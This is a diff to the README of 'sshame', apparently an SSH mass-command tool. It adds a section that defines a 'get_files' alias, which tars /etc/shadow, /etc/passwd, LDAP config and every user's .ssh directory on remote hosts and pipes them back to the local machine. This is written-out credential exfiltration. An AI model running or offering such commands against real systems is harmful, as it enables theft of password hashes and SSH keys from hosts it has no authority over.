@@ -120,6 +120,22 @@ With `commands -r` diplay the results:
     | 434f163a-24b5-4775-a3c1-6ea41745b18d | 10.0.0.2       |          22 | root       | whoami               |             0 | root            | 2019-08-25 21:28:23 |
     | 305e3f5d-bf4d-4024-981a-59b2dddebbcd | 10.0.0.1       |          22 | admin      | whoami               |             0 | admin           | 2019-08-25 21:28:23 |
 
+### Pipe remote commands to a local shell ###
+
+Define an alias `get_files` for a remote command `tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0`
+ and pipe it to a local `uudecode -o - |tar xzf -`, with:
+
+   commands -a get_files "tar -cf -  /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode /dev/stdout; exit 0" -p "uudecode -o - |tar xzf -"
+
+`exit 0` is to override tar's exit code in case of missing files.
+
+Run te defined command with:
+
+   run_cmd -c get_files
+
+The output you will find in the folder `output/<host>_<port>/username/...`
+
+
 ### Session management ###
 
 You may want to split wokloads into sessions. Use `session name` to switch between sessions. Default session is 
@@ -131,8 +147,6 @@ name, e.g. `default.db`
     (sshame) session test
     2019-08-25 23:38:38,283 sshame [I] 'Openning session: sqlite:///test.db'
 
-## Version history ##
+### License ###
 
-### sshame 0.5 - 2019-08-25 ###
-
-Initial release
+MIT
